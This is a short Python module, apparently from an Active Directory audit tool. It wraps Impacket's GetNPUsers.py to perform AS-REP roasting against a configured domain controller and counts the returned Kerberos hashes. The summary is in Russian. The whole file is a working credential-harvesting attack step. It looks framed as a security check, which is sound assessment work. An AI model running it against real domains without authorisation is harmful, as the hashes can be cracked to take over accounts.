from config import CONFIG
from utils.runner import run_tool

def parse_impacket(out: str):
    hashes = out.count("::") + out.count("krb5asrep")
    summary = f"Найдено AS-REP хэшей: {hashes}"
    return {"hashes_found": hashes, "summary": summary}

def run_impacket_check():
    cmd = ["python3", "/usr/share/doc/python3-impacket/examples/GetNPUsers.py",
           f"{CONFIG['domain']}/{CONFIG['username']}:{CONFIG['password']}",
           "-dc-ip", CONFIG['dc_ip'], "-request"]
    res = run_tool(cmd, "GetNPUsers (AS-REP)", parse_impacket)
    
    return {
        "tool": "AS-REP Roasting (GetNPUsers.py)",
        "status": "success",
        "data": {"subresults": [res]}
    }
